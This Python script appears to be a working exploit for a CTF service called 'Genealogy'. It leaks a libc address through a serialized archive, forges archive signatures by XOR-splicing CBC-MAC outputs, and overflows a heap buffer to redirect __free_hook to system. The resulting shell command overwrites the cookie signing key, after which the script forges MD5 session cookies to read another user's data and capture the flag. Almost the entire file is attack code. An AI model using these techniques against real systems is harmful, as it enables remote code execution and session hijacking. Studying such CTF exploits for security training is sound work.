#!/usr/bin/env python3
import hashlib
import itertools
import random
import string
import sys
from typing import Iterable

from pwn import ELF

from client import GenealogyClient

PAYLOAD = b"echo -n a > ./keys/cookie.key"
assert len(PAYLOAD) < 60 * 8

PORT = 8888
AES_BLOCK_SIZE = 16
PERSON_BROTOBUF_SIZE = 0xd8


def generate_random_string(length: int = 10, alphabet: str = string.ascii_lowercase):
    return "".join(random.sample(alphabet, length))


def get_libc_address(endpoint: str):
    login = generate_random_string()
    password = generate_random_string()

    with GenealogyClient(endpoint) as client:
        client.create_user(login, password)
        client.login(login, password)
        client.create_tree("title", "description")

        parent_id = client.create_person("", 0, 0, None, None)
        person_id = client.create_person("", 0, 0, parent_id, None)
        client.update_tree("description", person_id)

        archive = client.download_tree_archive()
        print_bytes_hex(archive)
        parsed_archive = client.check_tree_archive(archive)
        leaked_address = parsed_archive["tree"]["person"]["parents"][0]["birth_date"]
        print("Leaked address:", hex(leaked_address))

    # Main Arena offset can be obtained with https://github.com/bash-c/main_arena_offset
    # $ ./main_arena libc-2.31.so
    # [+]libc version : glibc 2.31
    # [+]build ID : BuildID[sha1]=54eef5ce96cf37cb175b0d93186836ca1caf470c
    # [+]main_arena_offset : 0x1beb80
    main_arena_offset = 0x1beb80
    main_arena_element_offset = 0x60  # because of size of our chunks
    libc_address = leaked_address - main_arena_offset - main_arena_element_offset
    print("Libc base address:", hex(libc_address))
    return libc_address


def extract_archive_and_signature(data: bytes) -> tuple[bytes, bytes]:
    return data[:-AES_BLOCK_SIZE], data[-AES_BLOCK_SIZE:]


def get_length_and_padding_for(data: bytes) -> bytes:
    length = len(data) + 2
    padded_length = (length + AES_BLOCK_SIZE) // AES_BLOCK_SIZE * AES_BLOCK_SIZE
    return bytes([len(data) // 256, len(data) % 256] + [padded_length - length] * (padded_length - length))


def print_bytes_hex(data: bytes, row_length: int = 64):
    for idx, byte in enumerate(data):
        print("%02x " % byte, end="")
        if (idx + 1) % row_length == 0:
            print()
    if len(data) % row_length != 0:
        print()


def bytes_to_number(data: bytes) -> int:
    assert len(data) <= 8
    result = 0
    for byte in reversed(data):
        result = result * 256 + byte
    return result


def generate_payload(total_length: int) -> list[int]:
    result = []
    for idx in range(0, len(PAYLOAD), 8):
        result.append(bytes_to_number(PAYLOAD[idx:idx + 8]))
    return result + list(range(1, total_length - len(result) + 1))


def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
    login = generate_random_string()
    password = generate_random_string()

    # 60 is max size of owners list
    payload = generate_payload(60)

    # 0x257 is desired total length, 173 is a total size of other fields (may change if you change PAYLOAD)
    description_length = 0x257 - 173

    with GenealogyClient(endpoint) as client:
        user_id = client.create_user(login, password)
        client.login(login, password)
        # Put enough chunks to tcache (2 will be enough)
        grandparent = client.create_person("", 1, 2, None, None)
        parent = client.create_person("", 1, 2, grandparent, None)
        root = client.create_person("", 1, 2, parent, None)
        client.create_tree("", "x" * description_length, root)

        client.update_owners(payload)

        archive_with_signature = client.download_tree_archive()

    archive, signature = extract_archive_and_signature(archive_with_signature)
    return user_id, archive, signature


def generate_second_archive(endpoint: str, user_id_length: int, total_length: int) -> tuple[str, str, bytes, bytes]:
    login = generate_random_string()
    password = generate_random_string()

    # 1 byte for id's field number,
    # 3 bytes for title's field number and length (length is large enough to occupy 2 bytes)
    title_length = total_length - user_id_length - 1 - 3
    title = "x" * title_length

    with GenealogyClient(endpoint) as client:
        client.create_user(login, password)
        client.login(login, password)
        client.create_tree(title, "")

        archive_with_signature = client.download_tree_archive()

    archive, signature = extract_archive_and_signature(archive_with_signature)
    return login, password, archive, signature


def generate_third_archive(endpoint: str, login: str, password: str, description: str, free_hook_address: int, system_address: int):
    with GenealogyClient(endpoint) as client:
        client.login(login, password)
        tree = client.get_tree()

        client.update_owners([0, 0x1c1, free_hook_address])

        a = client.create_person("", 0, 0, None, None)
        b = client.create_person("", 0, 0, None, None)
        c = client.create_person("", system_address, 0, a, b)
        d = client.create_person("", system_address, 0, None, None)
        e = client.create_person("", 0, 0, c, d)
        f = client.create_person("", 0, 0, None, None)
        g = client.create_person("", 0, 0, e, f)

        client.update_tree(description, g)

        archive_with_signature = client.download_tree_archive()

    archive, signature = extract_archive_and_signature(archive_with_signature)
    return archive, signature


def xor(array1: Iterable, array2: Iterable) -> Iterable:
    for x1, x2 in itertools.zip_longest(array1, array2, fillvalue=0):
        yield x1 ^ x2


def rce(endpoint: str, libc_address: int):
    # libc-2.31.so is extracted from the docker image (gcc:11-bullseye)
    # If it will change in future, just replace file here.
    libc = ELF("./libc-2.31.so")
    libc.address = libc_address

    user_id, archive1, signature1 = generate_first_archive(endpoint)
    print("Archive for user 1:")
    print_bytes_hex(archive1)
    print("Was padded by:", end=" ")
    length_and_padding1 = get_length_and_padding_for(archive1)
    print_bytes_hex(length_and_padding1)
    print("Signature for user 1:", end=" ")
    print_bytes_hex(signature1)

    login2, password2, archive2, signature2 = generate_second_archive(endpoint, 1 if user_id < 127 else 2, len(archive1))
    print("Archive for user 2:")
    print_bytes_hex(archive2)
    print("Was padded by:", end=" ")
    length_and_padding2 = get_length_and_padding_for(archive2)
    print_bytes_hex(length_and_padding2)
    print("Signature for user 2:", end=" ")
    print_bytes_hex(signature2)

    assert(length_and_padding1 == length_and_padding2)

    padding_length = len(length_and_padding1) - 2
    description = length_and_padding1[2:].decode() + "x" * (length_and_padding1[1] - padding_length)
    archive3, signature3 = generate_third_archive(endpoint, login2, password2, description, libc.symbols["__free_hook"], libc.symbols["system"])
    print("Archive for user 3:")
    print_bytes_hex(archive3)
    print("Was padded by:", end=" ")
    length_and_padding3 = get_length_and_padding_for(archive3)
    print_bytes_hex(length_and_padding3)
    print("Signature for user 3:", end=" ")
    print_bytes_hex(signature3)

    suffix = archive3[len(archive1) + len(length_and_padding1):]
    hacked_archive = archive1 + length_and_padding1 + bytes(xor(xor(signature1, signature2), suffix)) + signature3
    print("Hacked archive with buffer overflow:")
    print_bytes_hex(hacked_archive)
    with GenealogyClient(endpoint) as client:
        client.login(login2, password2)
        try:
            client.check_tree_archive(hacked_archive)
        except:
            pass

    # if PAYLOAD has been run, then we know signing key, so we can hijack cookies
    print("Enter flag id (user id from the service)")
    user_id = int(input())

    user_hash_cookie = hashlib.md5(b"a" + str(user_id).encode() + b"a").hexdigest()
    with GenealogyClient(endpoint) as client:
        r = client.client.get("/tree", cookies={"user_id": str(user_id), "user_hash": user_hash_cookie})

    # Flag is somewhere here:
    print(r.json())


def main(endpoint: str):
    libc_address = get_libc_address(endpoint)
    rce(endpoint, libc_address)


if __name__ == "__main__":
    address = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    endpoint = f"http://{address}:{PORT}/"
    main(endpoint)
